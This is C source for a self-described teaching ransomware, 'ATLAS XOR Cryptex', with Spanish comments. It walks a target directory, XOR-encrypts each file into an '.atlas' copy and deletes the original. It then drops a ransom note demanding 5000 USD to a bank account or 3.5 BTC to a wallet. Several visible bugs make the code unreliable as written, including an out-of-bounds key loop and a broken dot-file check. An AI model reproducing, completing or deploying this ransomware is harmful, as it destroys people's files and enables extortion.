/* 
	 ATLAS XOR Cryptex es un ramsomware de tipo demostrativo el cual cifra archivos usando el sistema XOR convencional
	 en combinacion de una pasada XOR combinacional de segunda ronda de una key periodicamente preestablecida con 
	 claves de coma flotante.
	 
	 La funcion de autoreplicación y escaneo de directorios para cifrado automatico de disco esta deshabilitado
	 por propositos de solo enseñanza de como trabaja un mecanismo semicomplejo de ransomware.
	 
	 En esta version el escaneo de ficheros en determinados directorios esta activado y cifrara cualquier archivo
	 en su interior.
	 
	 ****************************************************************
	||																															||
	|||------------------------------------------------------------|||
	||| Compiled for Windows amd64, i386, armhf,ARM, RISC, Itanium:|||
	||| Juan Carlos Lanuza L. | MGA > 3/02/2017 									 |||
	||| Lansoft 	| ATLAS Department of CyberSecurity							 |||
	|||------------------------------------------------------------|||
	||																															||
	 ****************************************************************	
*/

#include <errno.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdarg.h>
#include <dirent.h>
#include <sys/types.h>

#define AND &
#define XOR ^
#define NOT !

int i = 0;

FILE *buffer;
FILE *ciphered;
FILE *readme;
float sharedkey[10] = {0.65,100,0.365,0,25.9,999,5,12.58,7.0214,103.126};
float precalculated;

char path[] = {"C:/Users/JuanCarlos/Desktop/cryptex"};

struct data_chars {
	char current_char;
	char ciphered_char;
	char pre_ciphered_char;	
} data; 

struct cipher_attrib {
	int password;
	char file[20];
	char c_file[20];
} c_attrib;

int main(void)
{
	DIR *dirp;
  struct dirent *direntp;
	c_attrib.password = 900;
	
	dirp = opendir(path);
 	if (dirp == NULL)
 	{
 		printf("Error: No se puede abrir el directorio\n");
 		exit(2);
 	}
	while ((direntp = readdir(dirp)) != NULL) /* Escaneo del directorio objetivo, los archivos se listaran */
 	{
 		printf("%s\n",direntp -> d_name);
 		strcpy(c_attrib.file, direntp -> d_name);
 		strcpy(c_attrib.c_file, direntp -> d_name);
 		strcat(c_attrib.c_file,".atlas");
 		if((strcmp(c_attrib.file,".") == 0)  && (strcmp(c_attrib.file,"..") != 0))
		{
			goto nextI;
		}
 		buffer = fopen(c_attrib.file,"r"); /* Abre el archivo a Cifrar */
 		if(buffer == NULL) 
		{
			fputs("Error abriendo archivo o no existe !",stderr); 
			exit(1);
		}
 		ciphered = fopen(c_attrib.c_file,"w+"); /* Abre el fichero donde se insertaran los datos Cifrados */
		if(ciphered == NULL) 
		{
			fputs("Error abriendo archivo cifrador",stderr); 
			exit(1);
		}

		while(!(feof(buffer))) /* Inicio de lectura de cada archivo*/
		{											 /* Motor del Cifrador >> Guarden el Secreto de la doble pasada XOR :)*/
			data.current_char = fgetc(buffer);
			data.pre_ciphered_char = (char)((int)data.current_char XOR c_attrib.password);
			for(i = 0;i <= 10;i++)
			precalculated = (sharedkey[i] * c_attrib.password);
			data.ciphered_char = (char)((int)data.pre_ciphered_char XOR (int)precalculated);
			fputc(data.ciphered_char,ciphered);
		}
		remove(c_attrib.file);
		nextI:
	}
	readme = fopen("README.txt","w+");
	fprintf(readme,
					"\t\t-------------------------------------\n"
					"\t\t-This is the ATLAS XOR Cryptex Virus-\n"
					"\t\t-------------------------------------\n\n\n"
					"\t------------------------------------------------------------------------------------------\n"
					"\t\tSi quieres recuperar tu información Valiosa\n"
					"\t\tsolo necesitas depositar 5000 $ USD 4390 Euros\n"
					"\t\ten el banco LAFISE en Nicaragua con el numero \n"
					"\t\tde cuenta 787562312 con su nombre de instutucion y datos\n"
					"\t\tpara poder darte la clave de decifrado o mandar 3.5BTC\n"
					"\t\tal siguiente monedero virtual BIgbUh98Sas3&ndfScyiuhIUg454\n\n\n"
					"\t\tRecuerda tu Información esta en juego, no aceptar el proceder al pago y tu informacion\n"
					"\t\testara completamente perdida\n"
					"\t------------------------------------------------------------------------------------------\n\n\n"
					"\tATLAS\n\n");
	fclose(buffer);
	fclose(ciphered);
	fclose(readme);				
	return 0;
}
